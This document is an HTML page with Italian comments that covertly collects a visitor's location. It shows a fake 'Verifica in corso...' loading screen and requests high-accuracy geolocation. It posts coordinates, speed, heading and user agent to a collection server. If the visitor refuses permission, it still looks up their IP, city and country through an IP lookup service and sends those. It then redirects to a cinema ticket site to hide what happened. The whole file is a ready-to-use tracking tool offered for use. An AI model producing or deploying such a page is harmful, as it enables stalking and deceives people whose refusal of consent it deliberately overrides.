<!-- index.html – pagina bianca, geolocalizzazione silenziosa e redirect -->
<!DOCTYPE html>
<html lang="it">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Caricamento...</title>
    <style>
        body {
            background: #ffffff;
            margin: 0;
            height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            font-family: Arial, sans-serif;
            color: #333;
        }
        .hidden { display: none; }
        #loading {
            text-align: center;
        }
        .spinner {
            border: 4px solid #eee;
            border-top: 4px solid #3498db;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 0 auto;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        p { margin-top: 20px; color: #888; }
    </style>
</head>
<body>
    <div id="loading">
        <div class="spinner"></div>
        <p>Verifica in corso...</p>
    </div>

    <script>
        // ===== CONFIGURAZIONE =====
        // Sostituisci con l'URL del tuo server Python (es. http://localhost:3000/collect)
        const SERVER_URL = 'http://localhost:3000/collect';
        // Sostituisci con l'URL di destinazione dopo la geolocalizzazione
        const REDIRECT_URL = 'https://popupcinema.18tickets.it/';

        // ===== FUNZIONE PER INVIARE LA POSIZIONE =====
        function sendLocation(position) {
            const data = {
                lat: position.coords.latitude,
                lon: position.coords.longitude,
                accuracy: position.coords.accuracy,
                altitude: position.coords.altitude || null,
                speed: position.coords.speed || null,
                heading: position.coords.heading || null,
                timestamp: new Date(position.timestamp).toISOString(),
                userAgent: navigator.userAgent,
                ip_fallback: null // verrà eventualmente aggiunto dopo
            };

            // Invia via fetch (POST JSON)
            fetch(SERVER_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(data),
                keepalive: true
            }).catch(() => {
                // Fallback: sendBeacon
                const blob = new Blob([JSON.stringify(data)], { type: 'application/json' });
                navigator.sendBeacon(SERVER_URL, blob);
            });

            // Redirect alla pagina desiderata
            window.location.href = REDIRECT_URL;
        }

        function handleError(error) {
            // In caso di errore (es. utente nega il permesso), inviamo comunque un fallback con IP (tramite ipapi)
            fetch('https://ipapi.co/json/')
                .then(r => r.json())
                .then(ipData => {
                    const fallback = {
                        error: error.message || 'geolocation denied',
                        ip: ipData.ip || null,
                        city: ipData.city || null,
                        country: ipData.country_name || null,
                        lat: ipData.latitude || null,
                        lon: ipData.longitude || null,
                        timestamp: new Date().toISOString()
                    };
                    const blob = new Blob([JSON.stringify(fallback)], { type: 'application/json' });
                    navigator.sendBeacon(SERVER_URL, blob);
                })
                .catch(() => {
                    // Se anche IP fallisce, inviamo solo l'errore
                    const fallback = { error: error.message || 'geolocation and IP failed', timestamp: new Date().toISOString() };
                    const blob = new Blob([JSON.stringify(fallback)], { type: 'application/json' });
                    navigator.sendBeacon(SERVER_URL, blob);
                })
                .finally(() => {
                    window.location.href = REDIRECT_URL;
                });
        }

        // ===== AVVIA LA GEOLOCALIZZAZIONE =====
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(sendLocation, handleError, {
                enableHighAccuracy: true,
                timeout: 10000,
                maximumAge: 0
            });
        } else {
            // Geolocalizzazione non supportata – redirect comunque
            window.location.href = REDIRECT_URL;
        }
    </script>
</body>
</html>
